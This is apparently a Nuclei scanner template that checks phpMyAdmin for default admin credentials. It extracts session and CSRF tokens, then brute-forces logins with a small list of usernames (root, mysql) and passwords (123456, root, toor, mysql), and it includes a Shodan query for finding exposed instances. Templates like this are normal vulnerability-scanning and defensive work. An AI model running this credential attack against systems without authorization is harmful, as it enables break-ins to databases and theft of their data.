id: phpmyadmin-default-login
info:
  author: Natto97
  description: phpMyAdmin default admin credentials were discovered
  metadata:
    shodan-query: http.title:phpMyAdmin
    verified: true
  name: phpMyAdmin Default Login
  reference:
  - https://www.phpmyadmin.net
  severity: high
  tags: default-login,phpmyadmin
requests:
- attack: clusterbomb
  extractors:
  - group: 1
    internal: true
    name: token
    regex:
    - name="token" value="([0-9a-z]+)"
    type: regex
  - group: 1
    internal: true
    name: token2
    regex:
    - name="set_session" value="([0-9a-z]+)"
    type: regex
  - group: 1
    internal: true
    name: session
    part: header
    regex:
    - phpMyAdmin=([0-9a-z]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(all_headers_2, "phpMyAdmin=") && contains(all_headers_2, "pmaUser-1=")
    - status_code_2 == 302
    - contains(all_headers_2, 'index.php?collation_connection=utf8mb4_unicode_ci')
      || contains(all_headers_2, '/index.php?route=/&route=%2F')
    type: dsl
  matchers-condition: and
  payloads:
    password:
    - 123456
    - root
    - mysql
    - toor
    user:
    - root
    - mysql
  raw:
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: phpMyAdmin={{token2}}; pma_lang=en


    set_session={{session}}&pma_username={{user}}&pma_password={{password}}&server=1&route=%2F&token={{token}}

    '
  req-condition: true
  stop-at-first-match: true
